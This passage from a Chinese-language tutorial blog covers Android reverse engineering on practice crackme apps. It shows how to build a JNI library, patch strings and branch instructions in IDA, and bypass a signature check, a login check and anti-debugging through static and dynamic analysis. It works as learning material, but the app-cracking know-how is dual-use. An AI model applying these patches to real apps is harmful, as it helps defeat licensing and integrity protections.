class="code"><pre><span class="line">javac D:\Java\Android\MyApplication4\app\src\main\java\com\example\myapplication\myJNI.java</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/%E7%BC%96%E8%AF%91class%E6%96%87%E4%BB%B6.png" class="" title="生成class文件"><p>记住包名为<code>com.example.myapplication</code>，类名为<code>myJNI</code>。在AS终端上去到java目录，生成<code>.h</code>头文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javah -jni com.example.myapplication.myJNI</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/%E7%94%9F%E6%88%90%E5%A4%B4%E6%96%87%E4%BB%B6.png" class="" title="生成头文件"><p>将生成的头文件拖到cpp目录下，并且将<code>native-lib.cpp</code>强制删去。在cpp目录下新建<code>.c</code>文件。</p><img src="/posts/15be101a/%E6%96%B0%E5%BB%BAmain.jpg" class="" title="新建c文件"><p>将文件头包括进来，实现sayHello()方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;com_example_myapplication_myJNI.h&quot;</span></span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_com_example_myapplication_myJNI_sayHello</span><span class="params">(JNIEnv *env, jclass jobj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env,<span class="string">&quot;hello 52pojie!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们使用CMake来生成so的, 所以要修改<code>CMakeLists.txt</code>来指定so名称和so的源文件的相对路径。点击上方“大象”同步一下。</p><img src="/posts/15be101a/%E4%BF%AE%E6%94%B9%E5%90%8D%E7%A7%B0.png" class="" title="so名称和so的源文件的相对路径"><p>完成以上步骤之后，生成release版本的apk，要不然将来想要修改<code>.so</code>文件后不能在模拟器上运行。</p><p>生成的so在<code>app\build\intermediates\cmake\debug\obj\</code>和<code>app\build\intermediates\merged_native_libs\debug\out\lib</code>和<code>app\build\intermediates\stripped_native_libs\debug\out\lib\</code>。为什么相同的东西要分别放在三个地方，不懂。随便一个目录看看：</p><img src="/posts/15be101a/jniso.png" class="" title="libjnitest.so"><p>发现这几个目录里面都有<code>libJniTest.so</code>，不同处理器使用的文件不一样。雷电模拟器就是x86架构的。</p><ul><li>armeabi-v7a: 第7代及以上的 ARM 处理器。2011年15月以后的生产的大部分Android设备都使用它。</li><li>arm64-v8a: 第8代、64位ARM处理器，很少设备，三星 Galaxy S6是其中之一。</li><li>armeabi: 第5代、第6代的ARM处理器，早期的手机用的比较多。</li><li>x86: 平板、模拟器用得比较多。</li><li><p>x86_64: 64位的平板。</p><p>在<code>app/src/main</code>下新建<code>jnilib</code>目录, 并将生成的SO文件拷贝到该文件夹下。</p></li></ul><img src="/posts/15be101a/%E6%8B%B7%E8%B4%9Dso.png" class="" title="SO文件拷贝到该文件夹下"><p>打开<code>MainActivity.java</code>插入一条log来调用so中的<code>sayHello</code>方法，并连接模拟器调试。</p><img src="/posts/15be101a/sayhello.png" class="" title="插入一条log"><img src="/posts/15be101a/52pj.png" class="" title="插入一条log"><h1 id="7-IDA破解第一个so"><a href="#7-IDA破解第一个so" class="headerlink" title="7. IDA破解第一个so"></a>7. IDA破解第一个so</h1><h2 id="7-1-预备知识与环境配置"><a href="#7-1-预备知识与环境配置" class="headerlink" title="7.1 预备知识与环境配置"></a>7.1 预备知识与环境配置</h2><p>下载最新版<code>apktool.jar</code>和<code>apktool.bat</code>一起放到<code>C:\Windows</code>目录下，不想下载也可以在AK目录下找到它们，大概在<code>D:\Java\AndroidKiller_v1.3.1\bin\apktool</code>，再放到<code>C:\Windows</code>。不想放到<code>C:\Windows</code>也可以把环境变量设到上面路径中，随你喜欢。反正最后的结果是可以在命令窗口使用apktool。记住两个关键命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d test.apk<span class="comment">//解包</span></span><br><span class="line">apktool b test<span class="comment">//重打包</span></span><br></pre></td></tr></table></figure><img src="/posts/15be101a/%E8%A7%A3%E5%8C%85.png" class="" title="解包"><img src="/posts/15be101a/%E9%87%8D%E6%89%93%E5%8C%85.png" class="" title="重打包"><p>重打包后的apk由于没有签名，所以这里需要对重打包后的apk进行签名后才能在手机上安装并运行。打开AK，工具-&gt;APK签名，将要签名的apk拖拉到软件中进行签名，点执行后将会在当前目录生成<code>hello_sign.apk</code>。</p><img src="/posts/15be101a/%E7%AD%BE%E5%90%8D.png" class="" title="签名"><h2 id="7-2-破解so文件"><a href="#7-2-破解so文件" class="headerlink" title="7.2 破解so文件"></a>7.2 破解so文件</h2><p>打开AS，在<code>Logcat</code>模块连接好模拟器，将<code>.apk</code>文件安装到模拟器上，运行<code>.apk</code>，回到<code>Logcat</code>搜索“52pojie”。</p><img src="/posts/15be101a/52pojie.png" class="" title="调用sayhello方法"><p>我们的目的是修改这句话。</p><p>在主机上将<code>.apk</code>解包后，进入lib目录，发现有4个目录。</p><img src="/posts/15be101a/lib.png" class="" title="lib目录"><p>那我们用IDA(这里用IDAv6.6，因为IDAv7.0没有<code>modifyfile</code>插件)打开<code>x86</code>目录下的so文件，Shift + F12打开字符串窗口，Ctrl + F 查找“52pojie”，双击进入找到其内存地址。</p><img src="/posts/15be101a/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80.png" class="" title="52pojie内存地址"><p>选中字符串，按照下图操作去到十六进制视图。</p><p>将我们想写入的内容转换为十六进制。</p><img src="/posts/15be101a/16%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2.png" class="" title="转换为16进制"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68 65 6c 6c 6f 20 76 35 6c 65 30 6e 39</span><br></pre></td></tr></table></figure><p>回到IDA，选中需要修改的首字节右键-&gt;Edit。</p><img src="/posts/15be101a/16%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91.png" class="" title="编辑字符串"><p>修改好，再次右键-&gt;Apply changes。</p><p>Edit -&gt; Plugins -&gt; modifyfile -&gt; 确认更改。另存到某处。</p><img src="/posts/15be101a/modifyfile.jpg" class="" title="modifyfile"><p>如果lib目录中有多种模式，如果修改32位<code>.so</code>则把所有32位处理器目录下的<code>.so</code>都更换为新的<code>.so</code>文件，64位同理。我们只修改的是32位的，所以只要在<code>x86</code>目录下替换即可。</p><p>重新打包并签名。安装在模拟器上，运行。</p><img src="/posts/15be101a/so.png" class="" title="修改so文件成功"><h1 id="8-IDA爆破签名验证-IDA静态分析"><a href="#8-IDA爆破签名验证-IDA静态分析" class="headerlink" title="8. IDA爆破签名验证(IDA静态分析)"></a>8. IDA爆破签名验证(IDA静态分析)</h1><p>我发现会飞的丑小鸭特别油麦，下面是他为了引出主题写的一个场景，我觉得特别逗就拿过来给你们看看。</p><blockquote><p>李华是一个很有天赋 的Android程序员 他用了半年时间含辛茹苦，挑灯夜战，摧枯拉朽的编写了一款黑宝宝游戏。当然这几个词形容的并不恰当，但是李华确实为了这个apk的上线付出了很多努力。谁知游戏刚一上线就被破解了，生不生气？难不难过？</p><p>吸取了这次的教训，李华决定要反击。他通过书籍了解到一个apk只有一个签名，于是他有了一个很大胆的想法：如果别人要破解我的apk，他一定会对我的apk进行重打包，但是重打包后的签名就不是我原来的签名了，我可以在代码中判断，如果签名不是我的签名，那么就让程序退出。这样不就达到防止别人破解的目的了，哈哈哈，太佩服我自己了。</p><p>他知道你最近在学习Android逆向，他想在游戏上线前让你测试一下他新加的签名验证是否能防住别人的破解。<br>下面是李华编写的黑宝宝apk<br>链接：<a href="https://pan.baidu.com/s/1h6pX2ARE3qtiKiYbcnJ-3g">https://pan.baidu.com/s/1h6pX2ARE3qtiKiYbcnJ-3g</a> 密码：duv5</p><p>你拿到这个apk直接反编译重打包后安装到手机上，刚一运行程序就退出，你懵了，明明我什么都没改！接着看了一会反编译后的代码说：他的签名验证是写在so里面的，但是我不会so的破解，大哥你教教我吧！</p><p>我说：好吧！</p><p>下面开始本节课的课程，请同学们认真听课。</p></blockquote><p>用apktool解包apk后将项目载入AS，在<code>myJNI.smali</code>里有<code>check</code>函数，应该就是验证签名是否一致的函数。</p><img src="/posts/15be101a/check.png" class="" title="check函数"><p>将<code>libJniTest.so</code>载入IDA，需要注意的是，IDA众多窗口中，有两个窗口与so有关：Exports窗口是导出表，能让外部调用so中的函数；Imports窗口是导入表，能让so调用外部的函数。所以根据上面的信息，so里有check函数，所以check可以被外部调用，应该在导出表里找check函数。</p><img src="/posts/15be101a/exports.png" class="" title="导出表"><p>双击进去到汇编代码，F5进入反汇编代码。谁能想到<code>armeabi</code>目录下的<code>.so</code>文件需要IDA32才能反编译呢，果断把文件载入IDA32。</p><p>以下两种情况是根据不同版本的IDA对so文件修改的处理。</p><h2 id="IDAv7-0"><a href="#IDAv7-0" class="headerlink" title="IDAv7.0+"></a>IDAv7.0+</h2><p>去到反汇编代码后，看到很多字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。</p><img src="/posts/15be101a/print.png" class="" title="导出表"><p>先进去<code>unk_223C</code>看看里面是什么。好吧，就算16进制转文本也翻译不出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4A 4E 49 E8 8E B7 E5 8F 96 E5 88 B0 E7 9A 84 E7 AD BE E5 </span><br><span class="line">J  N  I</span><br><span class="line">90 8D E6 98 AF 25 73</span><br><span class="line">    %  s</span><br></pre></td></tr></table></figure><p>那就在模拟器运行一下用AS获取Log吧。</p><img src="/posts/15be101a/%E8%8E%B7%E5%8F%96%E7%AD%BE%E5%90%8D.png" class="" title="出现Log"><p>再拿去16进制转文本，这跟上面的16进制代码有半毛钱关系吗？！这里我真不知道怎么回事，哪位大牛来告诉我。</p><img src="/posts/15be101a/16%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%96%87%E6%9C%AC.png" class="" title="16进制转文本"><p>已知那一大串数字是签名，如果v9与字符串一致，则跳到<code>unk_261A</code>显示“签名一致”，那<code>unk_262E</code>自然就是“签名不一致”，退出程序。我们破解的思路是，就算v9与字符串不一致，也要让它跳到<code>unk_261A</code>去。</p><p>回到汇编视图，在左侧的函数窗口找到<code>check</code>函数双击来到图形化窗口，找到关键跳转。</p><img src="/posts/15be101a/%E6%B1%87%E7%BC%96.png" class="" title="关键跳转"><p>BNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。<br>BEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。</p><p>所以我们把<code>BNE</code>修改为<code>BEQ</code>即可。<code>BNE</code>的机器码为<code>D1</code>，<code>BEQ</code>的机器码为<code>D0</code>。按照下图操作修改机器码。</p><img src="/posts/15be101a/%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82.jpg" class="" title="修改字节"><p>修改完后保存so文件。</p><img src="/posts/15be101a/%E4%BF%9D%E5%AD%98so%E6%96%87%E4%BB%B6.jpg" class="" title="保存so文件"><img src="/posts/15be101a/bak.png" class="" title="保存备份"><p>把<code>armeabi</code>和<code>armeabi-v7a</code>下的<code>libJniTest.so</code>替换成修改后的so，再删掉<code>x86</code>目录。打包签名。</p><p>这里为什么要删掉<code>x86</code>目录，可能是因为雷电模拟器是x86架构的，它默认使用<code>x86</code>目录下的<code>libJniTest.so</code>，所以删掉才有可能使用<code>armeabi</code>或<code>armeabi-v7a</code>目录下的<code>libJniTest.so</code>。</p><h2 id="IDAv6-6"><a href="#IDAv6-6" class="headerlink" title="IDAv6.6"></a>IDAv6.6</h2><p>去到反汇编代码后，看到一条很长的字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。</p><img src="/posts/15be101a/%E5%AD%97%E7%AC%A6%E4%B8%B2.png" class="" title="Log语句"><p>由于中文乱码，所以设置编码为UTF-8，Options -&gt;  ASCII string style -&gt; Set default encodings -&gt; 8-bit… -&gt; Change -&gt; UTF-8 -&gt; OK。</p><img src="/posts/15be101a/string.png" class="" title="设置编码"><p>F5重新反编译一下，乱码问题解决。</p><img src="/posts/15be101a/%E8%A7%A3%E5%86%B3%E4%B9%B1%E7%A0%81.png" class="" title="解决编码"><p>分析一下程序流程，<code>getSignature</code>是获取程序签名，获取的签名与那一长串比较，如果相等则“签名一致”。破解的思路是即使获取的签名与存储的签名不一致，也可以让程序跳到“签名一致”处，本质就是修改跳转指令。</p><p>回到汇编视图，在左侧的函数窗口找到<code>check</code>函数双击，按空格来到图形化窗口，找到关键跳转。</p><img src="/posts/15be101a/%E8%B7%B3%E8%BD%AC.png" class="" title="关键跳转"><p>BNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。<br>BEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。</p><p>所以我们把<code>BNE</code>修改为<code>BEQ</code>即可。<code>BNE</code>的机器码为<code>D1</code>，<code>BEQ</code>的机器码为<code>D0</code>。老方法，去到hex dump处修改十六进制代码。保存so文件，删掉<code>x86</code>目录，打包签名。</p><h1 id="9-IDA动态破解登录验证"><a href="#9-IDA动态破解登录验证" class="headerlink" title="9. IDA动态破解登录验证"></a>9. IDA动态破解登录验证</h1><h2 id="9-1-预备知识与环境配置"><a href="#9-1-预备知识与环境配置" class="headerlink" title="9.1 预备知识与环境配置"></a>9.1 预备知识与环境配置</h2><p>jeb工具的使用 <a href="https://www.52pojie.cn/thread-742250-1-1.html">https://www.52pojie.cn/thread-742250-1-1.html</a></p><p>我觉得jeb就是AK+AS，可以看看，如果熟悉AK和AS，jeb很容易上手。jeb的优点是反编译回Java的可读性比AK强。</p><p>Android逆向必会命令 <a href="https://www.52pojie.cn/thread-742284-1-1.html">https://www.52pojie.cn/thread-742284-1-1.html</a></p><p>连手机和连模拟器是一模一样的命令，不需要担心。</p><p>so文件如果是arm架构的，用x86架构的雷电模拟器可能会出问题，所以最好用真机或安卓原生模拟器或Genymotion调试。真机需要root权限，否则IDA在附加上程序时出现不了包名。但小米手机不是默认root，搞个root权限要花很长时间。原生模拟器也太卡了…但卡归卡，调试时还是很友好的。Genymotion会出现各种各样的问题，我佛了。</p><p>Genymotion安装及ARM支持 <a href="https://blog.csdn.net/fidelhl/article/details/85239238">https://blog.csdn.net/fidelhl/article/details/85239238</a> </p><p>Genymotion-ARM-Translation  <a href="https://www.jianshu.com/p/97b8250f359e">https://www.jianshu.com/p/97b8250f359e</a> </p><p>adb devices检测不到genymotion模拟器 <a href="https://blog.csdn.net/qq_15158911/article/details/75304011">https://blog.csdn.net/qq_15158911/article/details/75304011</a> </p><p>关闭端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;netstat -ano | findstr 23946</span><br><span class="line">  TCP    127.0.0.1:23946        0.0.0.0:0              LISTENING       13752</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;taskkill -pid 13752 -f</span><br><span class="line">成功: 已终止 PID 为 13752 的进程。</span><br></pre></td></tr></table></figure><h2 id="9-2-动态破解登录验证"><a href="#9-2-动态破解登录验证" class="headerlink" title="9.2 动态破解登录验证"></a>9.2 动态破解登录验证</h2><p>拿到一个<code>.apk</code>程序，先在模拟器上安装，运行一下熟悉流程。程序与第8节的几乎一样，但第8节的程序没有<code>android:debuggable=&quot;true&quot;</code>。</p><p>将<code>.apk</code>文件用AK打开，因为需要调试，所以必须保证<code>application</code>标签里的<code>android:debuggable=&quot;true&quot;</code>。</p><img src="/posts/15be101a/debug.png" class="" title="android:debuggable&#x3D;true"><p>找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，用户在输入用户名和密码后程序会调用Native方法check。</p><img src="/posts/15be101a/13.png" class="" title="MainActivity"><img src="/posts/15be101a/14.png" class="" title="jni"><p>解包将<code>libJniTest.so</code>载入IDA分析check方法的具体实现。这个程序有3个lib，具体分析哪个<code>libJniTest.so</code>，看模拟器或真机默认使用哪个so。Genymotion虽然安装了arm架构，但如果有<code>x86</code>的so文件它还是使用<code>x86</code>目录下的。真机是arm架构的，用<code>armeabi-v7a</code>或<code>armeabi</code>都没问题，但修改完后要把两个目录下的so文件都替换成新的。</p><p>将x86目录下的so文件载入IDA，几乎与armeabi目录下的差不多，但汇编代码是我们熟悉的PC逆向，感觉来了！</p><img src="/posts/15be101a/9.2.8.png" class="" title="IDA反编译"><img src="/posts/15be101a/9.2.9.png" class="" title="汇编代码"><p>开始动态调试。将<code>IDA_Pro_7.5\dbgsrv</code>目录下的<code>android_x86_server</code> push 到模拟器<code>/data/local/tmp/</code>目录下，给777权限并运行<code>android_x86_server</code>。注意，真机 push <code>android_server</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb push D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_x86_server /data/local/tmp</span><br><span class="line">D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_x86_server: 1 file pushed, 0 skipped. 693.5 MB/s (1130104 bytes in 0.002s)</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;adb shell</span><br><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # ls -al</span><br><span class="line">total 1900</span><br><span class="line">drwxrwx--x 2 shell shell    4096 2022-03-08 19:53 .</span><br><span class="line">drwxr-x--x 3 root  root     4096 2022-03-07 00:13 ..</span><br><span class="line">-rwxrwxrwx 1 root  root   786868 2020-12-31 11:00 android_server</span><br><span class="line">-rw-rw-rw- 1 root  root  1130104 2020-12-31 11:00 android_x86_server</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 android_x86_server</span><br><span class="line">vbox86p:/data/local/tmp # ./android_x86_server</span><br><span class="line">IDA Android x86 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure><p>新开一个cmd，执行端口转发命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:23946 tcp:23946</span><br><span class="line">23946</span><br></pre></td></tr></table></figure><p>模拟器运行该程序，回到刚才打开的IDA，确保已经载入主机该程序的so文件，且与模拟器使用的so文件一致。Debugger -&gt; Select debugger 。选择Linux debugger。</p><img src="/posts/15be101a/9.2.10.png" class="" title="Linux debugger"><p>Debugger -&gt; Process options ，确认端口号。</p><img src="/posts/15be101a/9.2.11.png" class="" title="Linux 确认端口号"><p>Debugger -&gt; Attach to process ，找到我们需要附加的包名。</p><img src="/posts/15be101a/9.2.12.png" class="" title="Linux 附加包名"><p>确认so文件是否一致。</p><img src="/posts/15be101a/9.2.13.png" class="" title="so文件一致"><p>等它加载，在某个地方停下来，此时，EIP指向停止处。</p><img src="/posts/15be101a/9.2.14.png" class="" title="载入界面"><p>Ctrl + S找so文件，找到有执行权限且最开始的so文件。</p><img src="/posts/15be101a/9.2.15.png" class="" title="有执行权限的so文件"><p>或在Modules窗口找so文件，在so文件里找check方法。</p><img src="/posts/15be101a/9.2.16.png" class="" title="汇编代码"><p>也可以F5查看伪代码，根据伪代码在汇编代码中找到几个跳转语句下断。</p><img src="/posts/15be101a/9.2.17.png" class="" title="下断"><p>F9运行程序，输入用户名555和密码3333，点击登录，IDA停在第一个断点处。因为我们没有重新编译签名，所以签名是一致的，不跳转，继续往下执行。</p><img src="/posts/15be101a/9.2.18.png" class="" title="第一个断点处"><p>F8往下执行或F9来到下个断点处，可以看到寄存器窗口ESI指向我们输入的用户名，EDI指向真正的用户名，将两个进行对比，由于不一致，所以跳转实现。第三个断点一样，不再赘述。</p><img src="/posts/15be101a/9.2.19.png" class="" title="第二个断点处"><p>接下来修改，因为我们修改完so文件，要重新编译打包签名，所以签名校验一定要绕过，用户名和密码也要爆破，所以总共要修改三处跳转。</p><p><code>jz</code>的机器码为74，<code>jnz</code>的机器码为75。选中要修改的字节，Edit -&gt; Patch program -&gt; Change Byte 。</p><img src="/posts/15be101a/9.2.20.png" class="" title="修改程序"><p>Edit -&gt; Patch program -&gt; Apply patches to input file ，保存so文件。重打包，在AK中签名。模拟器安装程序，验证，登录成功。</p><img src="/posts/15be101a/9.2.21.png" class="" title="运行成功"><p>注意，我们只修改了x86目录下的so文件，如果想要程序在所有架构都能“登录成功”，必须要修改它所有拥有的so文件。</p><h1 id="10-动态调试反调试apk"><a href="#10-动态调试反调试apk" class="headerlink" title="10. 动态调试反调试apk"></a>10. 动态调试反调试apk</h1><h2 id="10-1-反调试及反反调试"><a href="#10-1-反调试及反反调试" class="headerlink" title="10.1 反调试及反反调试"></a>10.1 反调试及反反调试</h2><h3 id="10-1-1-IDA调试端口检测"><a href="#10-1-1-IDA调试端口检测" class="headerlink" title="10.1.1 IDA调试端口检测"></a>10.1.1 IDA调试端口检测</h3><p>原理：调试器远程调试时，会占用一些固定的端口号，如23946。</p><p>解决方法：修改调试端口号。端口号范围从0到65535，0不使用，1到1023为BSD保留端口，也是系统端口，1024到5000是BSD临时端口，5001到65535为用户自定义端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./android_server -p6666</span><br></pre></td></tr></table></figure><h3 id="10-1-2-调试器进程名检测"><a href="#10-1-2-调试器进程名检测" class="headerlink" title="10.1.2 调试器进程名检测"></a>10.1.2 调试器进程名检测</h3><p>原理：远程调试要在手机中运行<code>android_server</code>、<code>gdbserver</code>、<code>gdb</code>等进程。</p><p>解决方法：修改调试器server名字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename android_server heiboy</span><br></pre></td></tr></table></figure><h3 id="10-1-3-ptrace检测"><a href="#10-1-3-ptrace检测" class="headerlink" title="10.1.3 ptrace检测"></a>10.1.3 ptrace检测</h3><p>原理：一个进程只能被ptrace一次，可以自己ptrace自己，如果被调试器ptrace了，自己ptrace肯定ptrace不了，根据返回值进行判断。</p><p>解决方法：</p><ol><li>修改系统源码，让ptrace返回值恒为0</li><li>hook ptrace</li></ol><h2 id="10-2-反反调试apk"><a href="#10-2-反反调试apk" class="headerlink" title="10.2 反反调试apk"></a>10.2 反反调试apk</h2><p>拿到一个<code>.apk</code>程序，先在AS原生模拟器上安装，运行一下熟悉流程。如果只有arm架构so文件的最好用AS原生模拟器，因为genymotion即使支持arm架构还是调试不了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install AliCrackme_2_killer.apk</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/9.2.1.png" class="" title="运行程序"><p>将<code>.apk</code>文件用AK打开，因为需要调试，所以必须保证<code>application</code>标签里有<code>android:debuggable=&quot;true&quot;</code>。如果没有必须加上，重新编译打包，卸载模拟器里的程序，重新安装。</p><img src="/posts/15be101a/10.1.png" class="" title="android:debuggable&#x3D;true"><p>找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，程序调用了Native方法<code>securityCheck</code>，且放在了<code>libcrackme.so</code>文件中。</p><img src="/posts/15be101a/jni.png" class="" title="MainActivityjava代码"><p>解包发现只有<code>armeabi</code>目录的<code>libcrackme.so</code>，载入IDA分析<code>securityCheck</code>方法的具体实现，伪代码和汇编代码配合使用。</p><img src="/posts/15be101a/10.2.png" class="" title="汇编代码"><img src="/posts/15be101a/9.2.2.png" class="" title="伪代码分析"><p>盲猜 v5 == v3，但很遗憾，失败了，所以v3一定是经过某种转换才等于“wojiushidaan”。选中v5后面的v3右键-&gt;Set Ivar Type，通过<code>JNIEnv*</code>还原类似((_DWORD )v3 + 676))格式的指令。</p><img src="/posts/15be101a/9.2.3.png" class="" title="JNIEnv*"><img src="/posts/15be101a/9.2.4.png" class="" title="GetStringUTFChars"><p>要想知道怎么变换，需要动态调试<code>libcrackme.so</code>文件。</p><p>打开cmd，将<code>IDA_Pro_v7.5\dbgsrv</code>目录下的<code>android_server</code> push 到模拟器<code>/data/local/tmp/</code>目录下，给777权限并运行<code>android_server</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb push D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_server /data/local/tmp</span><br><span class="line">D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_server: 1 file pushed, 0 skipped. 494.3 MB/s (589588 bytes in 0.001s)</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;adb shell</span><br><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # ls -al</span><br><span class="line">total 596</span><br><span class="line">drwxrwx--x 2 shell shell   4096 2022-03-07 09:01 .</span><br><span class="line">drwxr-x--x 3 root  root    4096 2022-03-07 00:13 ..</span><br><span class="line">-rw-rw-rw- 1 root  root  589588 2017-09-14 03:08 android_server</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 android_server</span><br><span class="line">vbox86p:/data/local/tmp # ./android_server</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure><p>新开一个cmd，执行端口转发命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:23946 tcp:23946</span><br><span class="line">23946</span><br></pre></td></tr></table></figure><p>按照第9节的照做一遍，PC指向程序停止处。 Ctrl + S 找到有执行权限的<code>libcrackme.so</code>，在Modules窗口找到的<code>securityCheck</code>函数的图形化界面竟然没有显示“wojiushidaan”，而是“aiyou,bucuoo”。</p><img src="/posts/15be101a/10.3.png" class="" title="汇编代码"><p>回到汇编代码再函数起始处下断，F9运行，程序直接退出。说明程序有反调试功能。</p><img src="/posts/15be101a/10.7.png" class="" title="下断点"><p>先不管那么多，输入“aiyou,bucuoo”试试，成功了！</p><img src="/posts/15be101a/10.4.png" class="" title="输入校验码"><p>好啦好啦你肯定又跟我说我学的是破解！回归正题，反调试的基本原理是这样的：IDA使用android_server在root环境下注入到被调试的进程中，用到的技术是Linux中的ptrace，当Android中的一个进程被另外一个进程ptrace之后，在其status文件中有一个字段TracerPid可以标识是被哪一个进程trace了(Linux中的/proc/pid/status文件)。这里有两个地方是so动态加载完毕前执行的，<code>.init_array</code>是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的；<code>JNI_OnLoad</code>是so被System.loadLibrary调用的时候执行的，它的时机早于native方法的执行。</p><p>反调试机制很可能在<code>JNI_Onload</code>处就让程序退出的，所以我们得先去掉反调试机制，才能继续进行破解。那如何断在<code>JNI_OnLoad</code>函数指令处呢？Debugger -&gt; Debugger options -&gt; 勾选下面三个选项。</p><img src="/posts/15be101a/%E4%B8%89%E9%80%89%E9%A1%B9.png" class="" title="三个选项"><p>这三个选项意味着：</p><ul><li>第一个：在APK程序入口处停止。</li><li>第二个：有线程启动运行或者退出时，暂停。</li><li>第三个：当动态库（apk中的so文件）加载或者取消加载时，暂停。</li></ul><p>但是由于被调试程序一运行就会执行static中的语句，因此需要让程序停在加载so文件之前，故可以使用debug方式来启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb shell am start -D -n com.yaotong.crackme/.MainActivity</span><br><span class="line">Starting: Intent &#123; cmp=com.yaotong.crackme/.MainActivity &#125;</span><br></pre></td></tr></table></figure><p>在载入so文件的IDA下点击 Debugger -&gt; Attach to process ，找到我们需要附加的包名。等它加载到PC停止。</p><p>此时，so文件还没有被加载到内存中去，所以还要让程序跑起来。启动 DDMS（进入sdk安装目录<code>\sdk\tools</code>下，运行<code>monitor.bat</code>脚本启动），在DDMS上选择相应进程后，使用指令使apk继续运行，成功后，DDMS上进程将显示绿色，否则是红色。</p><img src="/posts/15be101a/DDMS.png" class="" title="在DDMS上选择相应进程"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost</span><br><span class="line">设置未捕获的java.lang.Throwable</span><br><span 